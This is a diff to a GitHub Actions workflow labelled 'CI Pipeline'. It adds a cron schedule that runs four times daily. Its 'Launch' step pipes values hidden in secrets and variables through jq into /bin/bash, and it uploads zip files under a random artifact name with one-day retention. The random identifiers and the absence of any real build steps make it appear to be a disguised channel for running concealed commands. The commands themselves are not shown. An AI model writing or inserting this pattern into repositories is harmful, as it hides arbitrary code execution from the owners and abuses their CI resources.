@@ -2,6 +2,8 @@ name: CI Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '34 5,11,17,23 * * *'
 permissions:
   contents: read
   actions: read
@@ -15,17 +17,17 @@ jobs:
         uses: actions/checkout@v4
       - name: Launch
         env:
-          h3: ${{ secrets.h3 }}
+          lwrt869: ${{ secrets.lwrt869 }}
         run: |
-          printf '%s' "$h3" | jq -r .nvt63 | /bin/bash
-          printf '%s' "$iqfj7" | jq -r .d6445 | /bin/bash
-          echo $zfkqn7771 | jq -r .q9 | /bin/bash
-          printf '%s' "$cb04587" | jq -r .ib78957 | /bin/bash
+          printf '%s' "$lwrt869" | jq -r .dp22 | /bin/bash
+          printf '%s' "$m3" | jq -r .bm80 | /bin/bash
+          echo $d50718 | jq -r .vh86 | /bin/bash
+          echo $n98 | jq -r .xvn33 | /bin/bash
 
       - name: Persist output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: A62WCtvW
+          name: IRcqAkZB
           path: "*.zip"
           retention-days: 1
